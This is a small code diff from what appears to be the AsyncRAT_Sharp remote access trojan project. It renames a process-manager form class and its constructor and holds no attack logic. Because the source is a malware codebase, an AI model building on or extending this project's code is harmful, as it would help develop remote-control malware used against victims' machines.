@@ -13,9 +13,9 @@ using AsyncRAT_Sharp.Sockets;
 
 namespace AsyncRAT_Sharp.Forms
 {
-    public partial class ProcessManager : Form
+    public partial class FormProcessManager : Form
     {
-        public ProcessManager()
+        public FormProcessManager()
         {
             InitializeComponent();
         }
